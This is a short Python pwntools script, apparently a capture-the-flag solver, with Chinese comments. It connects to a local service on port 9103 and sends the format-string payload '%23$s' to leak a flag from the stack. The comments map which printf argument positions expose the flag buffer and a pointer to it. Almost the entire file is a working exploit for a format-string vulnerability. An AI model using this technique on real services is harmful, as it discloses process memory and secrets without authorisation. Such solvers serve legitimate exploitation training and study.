#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9103'))

context(arch='amd64', os='linux', log_level='info')

p = remote(HOST, PORT)
p.recvuntil(b'Say something:')
# flag[64] 在 rbp-0x50，printf 的第 6 个位置参数即 buf 起始：
#   %14$p 是 flag[0..7]，%15$p 是 flag[8..15]
# 另有 char *leak = flag 落在 rbp-8 -> %23$s 直接打印整串
p.sendline(b'%23$s')
print(p.recvuntil(b'\n', timeout=3).decode(errors='replace'))
